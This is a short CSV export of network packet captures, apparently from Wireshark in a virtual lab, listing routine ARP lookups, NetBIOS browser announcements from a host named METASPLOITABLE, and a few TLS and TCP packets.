"362","683.315426966","PcsCompu_c9:93:64","PcsCompu_a3:ab:42","ARP","42","Who has 10.0.2.4? Tell 10.0.2.5"
"363","683.316592021","PcsCompu_a3:ab:42","PcsCompu_c9:93:64","ARP","60","10.0.2.4 is at 08:00:27:a3:ab:42"
"364","707.858190879","10.0.2.4","10.0.2.255","BROWSER","286","Local Master Announcement METASPLOITABLE, Workstation, Server, Print Queue Server, Xenix Server, NT Workstation, NT Server, Master Browser"
"365","707.858831814","10.0.2.4","10.0.2.255","BROWSER","257","Domain/Workgroup Announcement WORKGROUP, NT Workstation, Domain Enum"
"366","718.543801544","34.107.243.93","10.0.2.5","TLSv1.2","78","Application Data"
"367","718.543969952","10.0.2.5","34.107.243.93","TLSv1.2","82","Application Data"
"368","718.782059596","34.107.243.93","10.0.2.5","TCP","60","443  >  57910 [ACK] Seq=73 Ack=85 Win=32550 Len=0"
"369","723.762999933","PcsCompu_c9:93:64","RealtekU_12:35:00","ARP","42","Who has 10.0.2.1? Tell 10.0.2.5"
"370","723.763576963","RealtekU_12:35:00","PcsCompu_c9:93:64","ARP","60","10.0.2.1 is at 52:54:00:12:35:00"